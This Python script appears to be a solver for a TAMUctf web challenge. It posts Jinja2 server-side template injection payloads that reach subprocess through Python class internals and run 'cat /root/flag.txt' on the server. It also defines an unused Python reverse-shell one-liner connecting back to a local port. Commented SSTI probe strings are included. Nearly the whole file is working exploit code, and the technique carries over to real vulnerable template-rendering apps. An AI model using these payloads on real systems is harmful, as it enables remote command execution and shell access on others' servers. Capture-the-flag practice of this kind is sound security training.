#!/usr/bin/env python
import requests

url = 'http://web3.tamuctf.com/science'

payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

data = {
	#"chem1":"{{''.__class__.__mro__[2].__subclasses__()}}",
	"chem1":"{{g}}",
	#"chem2":"{{7*7}}"
	"chem2":"{{''.__class__.__mro__[2].__subclasses__()[230]([\"cat /root/flag.txt\"], shell=True)}}"
}

s = requests.Session()
r = s.post(url, data = data)

if (str(r.text) != "Something went wrong"):

	result = r.text
	result = str(result)[83:-182].replace("&gt;",">").replace("&lt;","<").replace("&#39;","'").split(" and ")

	cont = 0

	for i in result[0].split(", "):
		print "[" + str(cont) + "]: " + i
		cont += 1

	print "\n===================================\n"

	cont = 0

	for j in result[1].split(", "):
		print "[" + str(cont) + "]: " + j
		cont += 1
else:
	print r.text

s.close()